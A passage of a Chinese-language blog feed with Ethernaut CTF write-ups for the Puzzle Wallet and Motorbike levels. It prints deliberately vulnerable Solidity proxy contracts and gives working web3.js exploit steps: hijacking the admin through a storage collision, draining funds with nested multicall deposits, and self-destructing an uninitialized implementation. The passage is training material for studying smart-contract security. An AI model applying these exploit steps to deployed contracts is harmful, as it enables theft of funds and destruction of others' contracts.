class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.balanceOf(t1, instance).then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.toString())<br><span class="hljs-comment">//&#x27;0&#x27;</span><br><br><span class="hljs-keyword">await</span> contract.balanceOf(t2, instance).then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.toString())<br><span class="hljs-comment">//&#x27;0&#x27;</span><br></code></pre></td></tr></table></figure><p>提交实例</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220311153054894.png" alt="image-20220311153054894"></p><h2 id="24-Puzzle-Wallet"><a href="#24-Puzzle-Wallet" class="headerlink" title="24. Puzzle Wallet"></a>24. Puzzle Wallet</h2><h3 id="闯关要求-11"><a href="#闯关要求-11" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>事实上，如今，为 DeFi 运营付费是不可能的。</p><p>一群朋友发现了如何通过在一个交易中批量处理来稍微降低执行多个交易的成本，因此他们开发了一个智能合约来执行此操作。</p><p>他们需要这个合约是可升级的，以防代码包含错误，他们还想阻止团队外的人使用它。 为此，他们投票并分配了两个在系统中具有特殊角色的人：管理员，有权更新智能合约的逻辑。 所有者，控制允许使用合约的地址白名单。 合同已部署，该组被列入白名单。 每个人都为他们对抗邪恶矿工的成就欢呼。</p><p>他们几乎不知道，他们的午餐钱处于危险之中……</p><p>你需要劫持这个钱包才能成为代理的管理员。</p><h3 id="合约代码-11"><a href="#合约代码-11" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br>pragma experimental ABIEncoderV2;<br><br>import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;<br>import &quot;@openzeppelin/contracts/proxy/UpgradeableProxy.sol&quot;;<br><br>contract PuzzleProxy is UpgradeableProxy &#123;<br>    address public pendingAdmin;<br>    address public admin;<br><br>    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public &#123;<br>        admin = _admin;<br>    &#125;<br><br>    modifier onlyAdmin &#123;<br>      require(msg.sender == admin, &quot;Caller is not the admin&quot;);<br>      _;<br>    &#125;<br><br>    function proposeNewAdmin(address _newAdmin) external &#123;<br>        pendingAdmin = _newAdmin;<br>    &#125;<br><br>    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;<br>        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);<br>        admin = pendingAdmin;<br>    &#125;<br><br>    function upgradeTo(address _newImplementation) external onlyAdmin &#123;<br>        _upgradeTo(_newImplementation);<br>    &#125;<br>&#125;<br><br>contract PuzzleWallet &#123;<br>    using SafeMath for uint256;<br>    address public owner;<br>    uint256 public maxBalance;<br>    mapping(address =&gt; bool) public whitelisted;<br>    mapping(address =&gt; uint256) public balances;<br><br>    function init(uint256 _maxBalance) public &#123;<br>        require(maxBalance == 0, &quot;Already initialized&quot;);<br>        maxBalance = _maxBalance;<br>        owner = msg.sender;<br>    &#125;<br><br>    modifier onlyWhitelisted &#123;<br>        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);<br>        _;<br>    &#125;<br><br>    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;<br>      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);<br>      maxBalance = _maxBalance;<br>    &#125;<br><br>    function addToWhitelist(address addr) external &#123;<br>        require(msg.sender == owner, &quot;Not the owner&quot;);<br>        whitelisted[addr] = true;<br>    &#125;<br><br>    function deposit() external payable onlyWhitelisted &#123;<br>      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);<br>      balances[msg.sender] = balances[msg.sender].add(msg.value);<br>    &#125;<br><br>    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;<br>        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);<br>        balances[msg.sender] = balances[msg.sender].sub(value);<br>        (bool success, ) = to.call&#123; value: value &#125;(data);<br>        require(success, &quot;Execution failed&quot;);<br>    &#125;<br><br>    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;<br>        bool depositCalled = false;<br>        for (uint256 i = 0; i &lt; data.length; i++) &#123;<br>            bytes memory _data = data[i];<br>            bytes4 selector;<br>            assembly &#123;<br>                selector := mload(add(_data, 32))<br>            &#125;<br>            if (selector == this.deposit.selector) &#123;<br>                require(!depositCalled, &quot;Deposit can only be called once&quot;);<br>                // Protect against reusing msg.value<br>                depositCalled = true;<br>            &#125;<br>            (bool success, ) = address(this).delegatecall(data[i]);<br>            require(success, &quot;Error while delegating call&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-11"><a href="#合约分析-11" class="headerlink" title="合约分析"></a>合约分析</h3><p>先看一下子合约UpgradeableProxy</p><ul><li><a href="https://blog.openzeppelin.com/proxy-patterns/">Proxy Patterns</a></li></ul><p>这里的漏洞是由于代理合约 ( ) 和逻辑合约 ( ) 之间的<strong>存储冲突</strong>而出现的。</p><p>在代理模式中，发送的任何调用/事务都不会直接转到逻辑合约（<code>PuzzleWallet</code>此处），但实际上是通过方法<strong>委托</strong>给代理合约（<code>PuzzleProxy</code>此处）内部的逻辑合约<code>delegatecall</code>。</p><p>由于<code>delegatecall</code>是上下文保留，因此上下文取自<code>PuzzleProxy</code>。这意味着，存储中的任何状态读取或写入都将发生在<code>PuzzleProxy</code>相应的插槽中，而不是<code>PuzzleWallet</code>.</p><p>有</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">slot | PuzzleWallet  -  PuzzleProxy</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-code"> 0   |   owner      &lt;-  pendingAdmin</span><br><span class="hljs-code"> 1   |   maxBalance &lt;-  admin</span><br><span class="hljs-code"> 2   |           . </span><br><span class="hljs-code"> 3   |           .</span><br></code></pre></td></tr></table></figure><ol><li><p>这意味着如果我们设置 <code>pendingAdmin</code> 为 <code>player</code> （通过  <code>PuzzleProxy</code> 中的 <code>proposeNewAdmin</code> 方法）， <code>player</code> 则自动成为 <code>owner</code> ！</p><p>由于<code>proposeNewAdmin</code> 方法设置为 <code>external</code> ，不能直接调用，但我们可以对函数调用的签名进行编码并将交易发送到合约</p></li><li><p><code>admin</code> 也和 <code>maxBalance</code>对应于相同的插槽（插槽 1）。如果我们可以<code>admin</code>以某种方式写入<code>maxBalance</code>的地址，我们可以写入<code>player</code>。</p><p><code>setMaxBalance</code> 只有当合约的余额为0时才能设置新 <code>maxBalance</code> 的</p><p>检查余额：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> getBalance(contract.address)<br><span class="hljs-comment">//0.001</span><br></code></pre></td></tr></table></figure><p>可以通过 <code>execute</code> 取出合约中的余额，但合约会跟踪每个用户的余额<code>balances</code>，您只能提取您存入的资金。我们需要一些方法来破解合约的记账机制，这样我们就可以提取比存入更多的钱，从而耗尽合约的余额。</p><p>可以多次调用相同<code>deposit</code>的方法，并且合约中的 <code>multicall</code> 方法可以将多笔交易批处理为一笔交易。 但是 <code>multicall</code> 会从数据中提取函数选择器（签名的前 4 个字节），并确保 <code>deposit</code> 每个事务只调用一次</p><p>所以选择调用一个 <code>multicall</code> ，其中调用多个<code>multicall</code> 并且这些 <code>multicall</code> 中的每一个都调用 <code>deposit</code> 一次</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">       multicall<br>          |<span class="hljs-string"></span><br><span class="hljs-string">   -----------------</span><br><span class="hljs-string">   </span>|<span class="hljs-string">               </span>|<br>multicall        multicall<br>   |<span class="hljs-string">                 </span>|<br> deposit          deposit     <br></code></pre></td></tr></table></figure></li></ol><h3 id="攻击流程-11"><a href="#攻击流程-11" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol><li>将 <code>player</code> 设置为 <code>owner</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">functionSignature = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;proposeNewAdmin&#x27;</span>,<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;function&#x27;</span>,<br>    <span class="hljs-attr">inputs</span>: [<br>        &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;address&#x27;</span>,<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;_newAdmin&#x27;</span><br>        &#125;<br>    ]<br>&#125;<br><br>params = [player]<br><br>data = web3.eth.abi.encodeFunctionCall(functionSignature, params)<br><br><span class="hljs-keyword">await</span> web3.eth.sendTransaction(&#123;<span class="hljs-attr">from</span>: player, <span class="hljs-attr">to</span>: instance, data&#125;)<br></code></pre></td></tr></table></figure><ol start="2"><li>验证owner并查询余额</li></ol><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220312223402638.png" alt="image-20220312223402638"></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220312223510320.png" alt="image-20220312223510320"></p><ol start="3"><li>将<code>owner</code>我们列入白名单</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.addToWhitelist(player)<br></code></pre></td></tr></table></figure><ol start="4"><li>获取函数调用编码</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">depositData = <span class="hljs-keyword">await</span> contract.methods[<span class="hljs-string">&quot;deposit()&quot;</span>].request().then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.data)<br><span class="hljs-comment">//&#x27;0xd0e30db0&#x27;</span><br><br>multicallData = <span class="hljs-keyword">await</span> contract.methods[<span class="hljs-string">&quot;multicall(bytes[])&quot;</span>].request([depositData]).then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.data)<br><span class="hljs-comment">//&#x27;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000&#x27;</span><br></code></pre></td></tr></table></figure><ol start="5"><li>调用<code>multicall</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.multicall([multicallData, multicallData], &#123;<span class="hljs-attr">value</span>: toWei(<span class="hljs-string">&#x27;0.001&#x27;</span>)&#125;)<br></code></pre></td></tr></table></figure><ol start="6"><li>提取相同的金额</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.execute(player, toWei(<span class="hljs-string">&#x27;0.002&#x27;</span>), <span class="hljs-number">0x0</span>)<br></code></pre></td></tr></table></figure><ol start="7"><li>检查余额</li></ol><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220312223721874.png" alt="image-20220312223721874"></p><ol start="8"><li>将 admin 设置为<code>player</code>：</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.setMaxBalance(player)<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220312223829682.png" alt="image-20220312223829682"></p><h2 id="25-Motorbike"><a href="#25-Motorbike" class="headerlink" title="25. Motorbike"></a>25. Motorbike</h2><h3 id="闯关要求-12"><a href="#闯关要求-12" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>Ethernaut 的摩托车拥有全新的可升级引擎设计。</p><p>你能自毁它的引擎并使摩托车无法使用吗？</p><h3 id="合约代码-12"><a href="#合约代码-12" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br><br>pragma solidity &lt;0.7.0;<br><br>import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;<br>import &quot;@openzeppelin/contracts/proxy/Initializable.sol&quot;;<br><br>contract Motorbike &#123;<br>    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br>    <br>    struct AddressSlot &#123;<br>        address value;<br>    &#125;<br>    <br>    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.<br>    constructor(address _logic) public &#123;<br>        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);<br>        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;<br>        (bool success,) = _logic.delegatecall(<br>            abi.encodeWithSignature(&quot;initialize()&quot;)<br>        );<br>        require(success, &quot;Call failed&quot;);<br>    &#125;<br><br>    // Delegates the current call to `implementation`.<br>    function _delegate(address implementation) internal virtual &#123;<br>        // solhint-disable-next-line no-inline-assembly<br>        assembly &#123;<br>            calldatacopy(0, 0, calldatasize())<br>            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)<br>            returndatacopy(0, 0, returndatasize())<br>            switch result<br>            case 0 &#123; revert(0, returndatasize()) &#125;<br>            default &#123; return(0, returndatasize()) &#125;<br>        &#125;<br>    &#125;<br><br>    // Fallback function that delegates calls to the address returned by `_implementation()`. <br>    // Will run if no other function in the contract matches the call data<br>    fallback () external payable virtual &#123;<br>        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);<br>    &#125;<br>    <br>    // Returns an `AddressSlot` with member `value` located at `slot`.<br>    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;<br>        assembly &#123;<br>            r_slot := slot<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Engine is Initializable &#123;<br>    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br><br>    address public upgrader;<br>    uint256 public horsePower;<br><br>    struct AddressSlot &#123;<br>        address value;<br>    &#125;<br><br>    function initialize() external initializer &#123;<br>        horsePower = 1000;<br>        upgrader = msg.sender;<br>    &#125;<br><br>    // Upgrade the implementation of the proxy to `newImplementation`<br>    // subsequently execute the function call<br>    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;<br>        _authorizeUpgrade();<br>        _upgradeToAndCall(newImplementation, data);<br>    &#125;<br><br>    // Restrict to upgrader role<br>    function _authorizeUpgrade() internal view &#123;<br>        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);<br>    &#125;<br><br>    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.<br>    function _upgradeToAndCall(<br>        address newImplementation,<br>        bytes memory data<br>    ) internal &#123;<br>        // Initial upgrade and setup call<br>        _setImplementation(newImplementation);<br>        if (data.length &gt; 0) &#123;<br>            (bool success,) = newImplementation.delegatecall(data);<br>            require(success, &quot;Call failed&quot;);<br>        &#125;<br>    &#125;<br>    <br>    // Stores a new address in the EIP1967 implementation slot.<br>    function _setImplementation(address newImplementation) private &#123;<br>        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);<br>        <br>        AddressSlot storage r;<br>        assembly &#123;<br>            r_slot := _IMPLEMENTATION_SLOT<br>        &#125;<br>        r.value = newImplementation;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="合约分析-12"><a href="#合约分析-12" class="headerlink" title="合约分析"></a>合约分析</h3><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/proxy/utils/Initializable.sol">Initializable.sol</a></p><p>当前的 <code>Engine</code> 在任何地方都没有自毁逻辑。但是，由于它是代理模式的逻辑/实现合约，它可以升级为具有 <code>selfdestruct</code> 的新合约。</p><p><code>upgradeToAndCall</code> 方法可供我们升级到新的合约地址，但它有一个授权检查 <code>_authorizeUpgrade</code> ，只有升级者地址才能调用它。</p><p>所以，我们需要更改 <code>upgrader</code> 的信息</p><p>注意，这里和 Puzzle Wallet 关卡一样， <code>Engine</code> 实际上存储在代理（ <code>Motorbike</code> ）的存储中。</p><p>我们可以在 <code>Engine</code> 的地址调用初始化，使<code>initialized</code>, <code>initializing</code> (来自 <code>Initializable</code>), <code>upgrader</code> 为默认值即<code>false</code>, <code>false</code>, <code>0x0</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// Initializable.sol<br>bool private _initialized;<br>bool private _initializing;<br>modifier initializer() &#123;<br>        // If the contract is initializing we ignore whether _initialized is set in order to support multiple<br>        // inheritance patterns, but we only do this in the context of a constructor, because in other contexts the<br>        // contract may have been reentered.<br>        require(_initializing ? _isConstructor() : !_initialized, &quot;Initializable: contract is already initialized&quot;);<br><br>        bool isTopLevelCall = !_initializing;<br>        if (isTopLevelCall) &#123;<br>            _initializing = true;<br>            _initialized = true;<br>        &#125;<br><br>        _;<br><br>        if (isTopLevelCall) &#123;<br>            _initializing = false;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>写一个有 <code>selfdestruct</code> 函数的合约，并通过 <code>upgradeToAndCall</code> 方法升级执行合约</p><p>如果我们通过 <code>upgradeToAndCall</code> 设置新的实现，将 <code>attackEngine</code> 地址和它的 <code>explode</code> 方法的编码作为参数传递，现有的 <code>Engine</code> 将自行销毁。 这是因为 <code>_upgradeToAndCall</code> 使用提供的数据参数将调用委托给给定的新实现地址。 并且由于 <code>delegatecall</code> 是上下文保留的，<code>explode</code> 方法的 <code>selfdestruct</code> 将在 <code>Engine</code> 的上下文中运行。 因此引擎被摧毁。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity &lt;0.7.0;<br><br>contract attackEngine &#123;<br>    function explode() public &#123;<br>        selfdestruct(address(0));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="攻击流程-12"><a href="#攻击流程-12" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//读取 Engine 地址</span><br>implAddr = <span class="hljs-keyword">await</span> web3.eth.getStorageAt(contract.address, <span class="hljs-string">&#x27;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#x27;</span>)<br><span class="hljs-comment">//&#x27;0x000000000000000000000000a81263b7b5c02eb2e8740dd9d224daab59fa5035&#x27;</span><br><br>implAddr = <span class="hljs-string">&#x27;0x&#x27;</span> + implAddr.slice(-<span class="hljs-number">40</span>)<br><span class="hljs-comment">//&#x27;0xa81263b7b5c02eb2e8740dd9d224daab59fa5035&#x27;</span><br><br><span class="hljs-comment">//在 Engine 的地址调用初始化</span><br>initializeData = web3.eth.abi.encodeFunctionSignature(<span class="hljs-string">&quot;initialize()&quot;</span>)<br><span class="hljs-comment">//&#x27;0x8129fc1c&#x27;</span><br><span class="hljs-keyword">await</span> web3.eth.sendTransaction(&#123; <span class="hljs-attr">from</span>: player, <span class="hljs-attr">to</span>: implAddr, <span class="hljs-attr">data</span>: initializeData &#125;)<br><br><span class="hljs-comment">//设置 upgrader 并验证</span><br>upgraderData = web3.eth.abi.encodeFunctionSignature(<span class="hljs-string">&quot;upgrader()&quot;</span>)<br><span class="hljs-comment">//&#x27;0xaf269745&#x27;</span><br><span class="hljs-keyword">await</span> web3.eth.call(&#123;<span class="hljs-attr">from</span>: player, <span class="hljs-attr">to</span>: implAddr, <span class="hljs-attr">data</span>: upgraderData&#125;).then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> <span class="hljs-string">&#x27;0x&#x27;</span> + v.slice(-<span class="hljs-number">40</span>).toLowerCase()) === player.toLowerCase()<br><span class="hljs-comment">//true</span><br><br><span class="hljs-comment">//部署 attackEngine 合约并设置合约地址</span><br>attackAddr = <span class="hljs-string">&#x27;0x030e5e8743dFb45E68D9010200b9aADeB7578EcF&#x27;</span><br><span class="hljs-comment">//&#x27;0x030e5e8743dFb45E68D9010200b9aADeB7578EcF&#x27;</span><br>explodeData = web3.eth.abi.encodeFunctionSignature(<span class="hljs-string">&quot;explode()&quot;</span>)<br><span class="hljs-comment">//&#x27;0xb8b3dbc6&#x27;</span><br><br><span class="hljs-comment">//升级合约</span><br>upgradeSignature = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;upgradeToAndCall&#x27;</span>,<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;function&#x27;</span>,<br>    <span class="hljs-attr">inputs</span>: [<br>        &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;address&#x27;</span>,<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;newImplementation&#x27;</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;bytes&#x27;</span>,<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;data&#x27;</span><br>        &#125;<br>    ]<br>&#125;<br>upgradeParams = [attackAddr, explodeData]<br><br>upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)<br><span class="hljs-comment">//&#x27;0x4f1ef286000000000000000000000000030e5e8743dfb45e68d9010200b9aadeb7578ecf00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004b8b3dbc600000000000000000000000000000000000000000000000000000000&#x27;</span><br><br><span class="hljs-comment">//在 implAddr 调用 upgradeToAndCall</span><br><span class="hljs-keyword">await</span> web3.eth.sendTransaction(&#123;<span class="hljs-attr">from</span>: player, <span class="hljs-attr">to</span>: implAddr, <span class="hljs-attr">data</span>: upgradeData&#125;)<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220313194207096.png" alt="image-20220313194207096"></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶场刷题</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | Ethernaut Part Ⅰ</title>
